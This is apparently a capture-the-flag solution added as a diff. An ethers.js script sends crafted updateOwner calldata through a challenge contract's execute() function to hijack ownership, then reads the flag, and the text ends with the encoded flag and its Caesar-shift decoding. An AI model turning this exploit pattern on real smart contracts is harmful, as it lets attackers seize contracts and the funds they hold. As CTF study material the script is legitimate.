@@ -1,0 +1,172 @@
+1.Code:
+/*RPC_URL=         # or your Infura/Alchemy RPC
+PRIVATE_KEY=        # account with ETH for gas
+MAIN_CONTRACT=0xB838058A2C3D034B44516FD02368044d0BD90fe6   # PhantomDelegate address
+FLAG_PROVIDER=0xfE7e20C4b1A36A4579d66DC82A0C8e0CA00EFA56  (optional) # # FlagProvider address
+*/
+import dotenv from "dotenv";
+dotenv.config();
+import * as ethersPkg from "ethers";
+// Helper to support ethers v5 and v6 differences
+function makeProvider(rpcUrl) {
+  // ethers v5: ethers.providers.JsonRpcProvider
+  if (ethersPkg.providers && typeof ethersPkg.providers.JsonRpcProvider === "function") {
+    return new ethersPkg.providers.JsonRpcProvider(rpcUrl);
+  }
+  // ethers v6: ethers.JsonRpcProvider
+  if (typeof ethersPkg.JsonRpcProvider === "function") {
+    return new ethersPkg.JsonRpcProvider(rpcUrl);
+  }
+  throw new Error("Unsupported ethers version: can't find JsonRpcProvider constructor");
+}
+
+// Helper to create Wallet connected to provider (v5/v6 compatible)
+function makeWallet(privateKey, provider) {
+  // v5 constructor: new ethers.Wallet(privateKey, provider)
+  // v6 constructor: new ethersPkg.Wallet(privateKey, provider)
+  if (typeof ethersPkg.Wallet === "function") {
+    return new ethersPkg.Wallet(privateKey, provider);
+  }
+  throw new Error("Unsupported ethers version: can't find Wallet constructor");
+}
+
+// ABI fragments (works for both v5 & v6)
+const MAIN_ABI = [
+  "function execute(bytes) external",
+  "function owner() view returns (address)"
+];
+const FLAG_ABI = [
+  "function getFlag() view returns (string)"
+];
+
+async function main() {
+  const RPC_URL = process.env.RPC_URL || process.argv[2];
+  const PRIVATE_KEY = process.env.PRIVATE_KEY || process.argv[3];
+  const MAIN = process.env.MAIN_CONTRACT || process.argv[4];
+  const FLAG_PROVIDER = process.env.FLAG_PROVIDER || process.argv[5] || null;
+
+  if (!RPC_URL || !PRIVATE_KEY || !MAIN) {
+    console.error("Missing required inputs. Set RPC_URL, PRIVATE_KEY, and MAIN_CONTRACT (env or args).");
+    process.exit(1);
+  }
+
+  const provider = makeProvider(RPC_URL);
+  const wallet = makeWallet(PRIVATE_KEY, provider);
+
+  console.log("Using wallet:", wallet.address || wallet.address);
+  console.log("RPC:", RPC_URL);
+  console.log("Main contract:", MAIN);
+  if (FLAG_PROVIDER) console.log("Flag provider :", FLAG_PROVIDER);
+
+  // Contract constructor: ethers v5 uses new ethers.Contract(addr, abi, signer)
+  // v6 exposes Contract in ethersPkg.Contract
+  const ContractCtor = ethersPkg.Contract || ethersPkg.ethers?.Contract;
+  if (!ContractCtor && !ethersPkg.Contract) {
+    // v6 top-level export is Contract
+    if (!ethersPkg.Contract) {
+      console.error("Cannot find Contract class in ethers package.");
+      process.exit(1);
+    }
+  }
+
+  const main = new (ethersPkg.Contract)(MAIN, MAIN_ABI, wallet);
+
+  // read owner before exploit
+  try {
+    const before = await main.owner();
+    console.log("Owner BEFORE exploit:", String(before));
+  } catch (err) {
+    console.error("Error reading owner():", err?.message ?? err);
+    process.exit(1);
+  }
+
+  // Build payload for updateOwner(address)
+  const InterfaceCtor = ethersPkg.utils?.Interface ?? ethersPkg.Interface;
+  if (!InterfaceCtor) {
+    console.error("Cannot find Interface constructor in ethers package.");
+    process.exit(1);
+  }
+  const iface = new InterfaceCtor(["function updateOwner(address)"]);
+  const DEAD = "0x000000000000000000000000000000000000dEaD";
+  const data = iface.encodeFunctionData("updateOwner", [DEAD]);
+  console.log("Prepared payload:", data);
+
+  // send execute(data)
+  try {
+    const tx = await main.execute(data, { gasLimit: 200_000 });
+    // log tx hash (different shapes across v5/v6)
+    console.log("Sent tx:", tx.hash ?? tx.transactionHash ?? tx);
+    const receipt = await tx.wait();
+    // receipt.status may be 1 or true depending on version
+    const ok = receipt && (receipt.status === 1 || receipt.status === true);
+    console.log("Tx mined. status:", ok ? "success" : receipt.status);
+    if (!ok) {
+      console.error("Transaction failed / reverted.");
+      process.exit(1);
+    }
+  } catch (err) {
+    console.error("Failed to send execute transaction:", err?.reason ?? err?.message ?? err);
+    process.exit(1);
+  }
+
+  // verify owner after exploit
+  try {
+    const after = await main.owner();
+    console.log("Owner AFTER exploit:", String(after));
+    if (String(after).toLowerCase() !== DEAD.toLowerCase()) {
+      console.error("Exploit didn't set owner to dead. Aborting.");
+      process.exit(1);
+    } else {
+      console.log("Owner correctly set to 0x...dEaD");
+    }
+  } catch (err) {
+    console.error("Error reading owner after exploit:", err?.message ?? err);
+    process.exit(1);
+  }
+
+  // function to try reading getFlag()
+  async function tryGetFlag(addr) {
+    try {
+      const fp = new (ethersPkg.Contract)(addr, FLAG_ABI, provider);
+      const flag = await fp.getFlag();
+      return flag;
+    } catch (err) {
+      return null;
+    }
+  }
+
+  if (FLAG_PROVIDER) {
+    console.log("Trying FlagProvider at provided address...");
+    const flag = await tryGetFlag(FLAG_PROVIDER);
+    if (flag) {
+      console.log("FLAG");
+      console.log(flag);
+      process.exit(0);
+    } else {
+      console.warn("Can't read getFlag() from provided FlagProvider (maybe wrong address or require failed).");
+    }
+  }
+
+  console.log("Trying getFlag() on MAIN contract as fallback...");
+  const flagOnMain = await tryGetFlag(MAIN);
+  if (flagOnMain) {
+    console.log("FLAG");
+    console.log(flagOnMain);
+    process.exit(0);
+  }
+
+  console.error("Could not retrieve flag automatically. Provide FLAG_PROVIDER or check explorer for the flag contract.");
+  process.exit(2);
+}
+
+main().catch((err) => {
+  console.error("Unexpected error:", err);
+  process.exit(1);
+});
+
+
+2.You will get output as
+FLAG
+NTCSCKMK{n3v3q@!o_cd0b@qo_m0!vs$syx_z^x3n}
+
+3.DJSISACA{d3l3g@!e_st0r@ge_c0!li$ion_p^n3d} by Rot 13 Bruteforce with amount = 16
